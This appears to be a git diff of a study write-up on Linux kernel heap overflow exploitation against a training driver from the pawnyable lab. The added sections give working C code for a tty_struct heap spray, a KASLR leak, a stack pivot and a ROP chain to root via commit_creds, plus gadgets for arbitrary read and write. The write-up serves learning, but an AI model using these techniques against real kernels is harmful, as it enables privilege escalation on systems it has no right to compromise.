@@ -99,11 +99,11 @@ Have the following characteristics:
 
 SLAB's memory management:
 
-![alt text](image.png)
+![alt text](./assets/image.png)
 
-![alt text](image-3.png)
+![alt text](./assets/image-3.png)
 
-![alt text](image-4.png)
+![alt text](./assets/image-4.png)
 
 In reality, there are several entries in the cache, and the pointers to the freed areas listed there are priority used.
 In addition, the following functions are provided by the `__kmem_cache_create` flag when generating a cache.
@@ -123,7 +123,7 @@ Have the following three features:
 
 The data structure and relationship of SLUB memory management are shown in the figure below (take from [here](https://blog.wohin.me/posts/pawnyable-0202/)):
 
-![alt text](image-1.png)
+![alt text](./assets/image-1.png)
 
 Details of each structure will show in [this article](https://evilpan.com/2020/03/21/linux-slab/#%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84).
 
@@ -147,7 +147,7 @@ Have the following characteristics:
 
 The freed areas are managed in a one-way list by size and offset as follows: (The arrows that emerge from the freed area are offset information, not pointers.)
 
-![alt text](image-2.png)
+![alt text](./assets/image-2.png)
 
 ## Heap overflow exploitation ideas
 
@@ -361,4 +361,130 @@ just focus on the `if (tty->ops->ioctl)` statement, the `ops` field of the `tty_
 
 We use heap spray because unlike the userspace heap, the kernel heap has no granularity that that chunk are allocate next to our overflow chunk. So even if we can overflow the `g_buf` buffer, we cannot guarantee that the `tty_struct` structure will be allocated next to it. So we need to use heap spray to allocate many `tty_struct` structures, and hope that one of them will be allocated next to the `g_buf` buffer.
 
-<updating...>
+```c
+void spray()
+{
+    for (int i = 0; i < SPRAY_NUM / 2; i++)
+    {
+        _spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+        if (_spray[i] == -1)
+            errExit("open ptmx");
+    }
+
+    fd = open("/dev/holstein", O_RDWR);
+    if (fd == -1)
+        errExit("open holstein");
+
+    for (int i = SPRAY_NUM / 2; i < SPRAY_NUM; i++)
+    {
+        _spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
+        if (_spray[i] == -1)
+            errExit("open ptmx");
+    }
+
+}
+```
+
+After this, we can have a high probability that one of the `tty_struct` structures will be allocated next to the `g_buf` buffer.
+
+## Kernel ROP
+
+Because the kernel has `KASLR` enabled, we need to leak a kernel address to bypass it. We can use the `read()` function to read the contents of the `g_buf` buffer, then just dump the contents of the `g_buf` buffer to find a kernel address. We also need `heap` address which is `g_buf` address to build the ROP chain too. Because we can't directly control the return address like stack overflow, we need to find a way to pivot the to our payload. RIP can be controlled by performing appropriate operations on the rewritten `tty_struct`, but we don't know which `tty_struct`, so let's operate on all the FDs that have been sprayed. Also, since we don't know the position of the function pointer being called, we create a suitable function table and determine the position of the function pointer being called from the crash message.
+
+```c
+// payload take from pawnyabe.cafe
+// i'm too lazy to write my own (just because i deleted my old exploit code :< )
+g_buf = *(unsigned long*)&buf[0x438] - 0x438;
+printf("[+] g_buf = 0x%016lx\n", g_buf);
+
+unsigned long *p = (unsigned long*)&buf;
+for (int i = 0; i < 0x40; i++) {
+  *p++ = 0xffffffffdead0000 + (i << 8);
+}
+*(unsigned long*)&buf[0x418] = g_buf;
+write(fd, buf, 0x420);
+
+for (int i = 0; i < 100; i++) {
+  ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
+}
+```
+
+![alt text](./assets/image-5.png)
+
+The kernel crashed, and we can see that the RIP is `0xffffffffdead0c00`, so the function pointer of `ioctl ops` is at offset `0xc00` (buf[12]). Use the pivot gadget
+at the offset 12, then just to a normal ROP
+
+```c
+void krop()
+{
+
+    uint64_t idx = 0;
+    uint64_t *rop = buf;
+    // buf[12] = pivot;
+    // buf[0x418 / 8] = g_buf;
+    // buf[0] = 0xffffffffdeadbeef;
+
+    rop[idx++] = pop_rdi_ret;               // 0 return address
+    rop[idx++] = 0x0;                       // 1
+    rop[idx++] = prepare_kernel_cred;       // 2
+    rop[idx++] = pop_rcx_ret;               // 3
+    rop[idx++] = 0;                         // 4
+    rop[idx++] = mov_rdi_rax_rep_movsq_ret; // 5
+    rop[idx++] = commit_creds;              // 6
+    rop[idx++] = pop_rcx_ret;               // 7
+    rop[idx++] = 0;                         // 8
+    rop[idx++] = pop_rcx_ret;               // 9
+    rop[idx++] = 0;                         // 10
+    rop[idx++] = pop_rcx_ret;               // 11
+    rop[idx++] = pivot;                     // 12
+    rop[idx++] = swapgs_restore_regs_and_return_to_usermode;
+    rop[idx++] = 0x0;
+    rop[idx++] = 0x0;
+    rop[idx++] = user_rip;
+    rop[idx++] = user_cs;
+    rop[idx++] = user_rflags;
+    rop[idx++] = user_rsp;
+    rop[idx++] = user_ss;
+
+    buf[0x418 / 8] = g_buf;
+    write(fd, buf, 0x420);
+
+    // Hijack control flow
+    logInfo("Triggering exploit...");
+    for (int i = 0; i < SPRAY_NUM; i++)
+    {
+        int ret = ioctl(_spray[i], 0xdeadbeef, g_buf - 0x10); // subtract 0x10 for pop r13; pop rbp;
+        // logInfo("ioctl[%d] = %d", i, ret);
+    }
+
+}
+```
+
+You can double check your payload by using `0xffffffffdeadbeef` in the first 8 bytes of `buf`, then you can see the RIP is `0xffffffffdeadbeef` in the crash message.
+
+You can also see my exploit code [here](./exp/exploit.c)
+
+## AAW/AAR Exploit
+
+As we can see before
+
+```c
+ioctl(spray[i], 0xdeadbeef, 0xcafebabe);
+
+RCX: 00000000deadbeef
+RDX: 00000000cafebabe
+RSI: 00000000deadbeef
+R08: 00000000cafebabe
+R12: 00000000deadbeef
+R14: 00000000cafebabe
+```
+
+We can control `RCX`, `RDX`, `RSI`, `R8`, `R12`, `R14` registers. So if we can find some gadgets that can use these registers, we can achieve AAW/AAR. For example, we can use the following gadgets:
+
+```c
+0xffffffff810477f7: mov [rdx], rcx; ret;
+0xffffffff8118a285: mov eax, [rdx]; ret;
+```
+
+There are 2 more sections in the [LK01-2](https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html) article that explain how to achieve AAW/AAR using these gadgets, leverage modprobe_path and core_pattern and CRED Structure. So I won't repeat it here.
+You can see all my exploit code [here](./exp/)
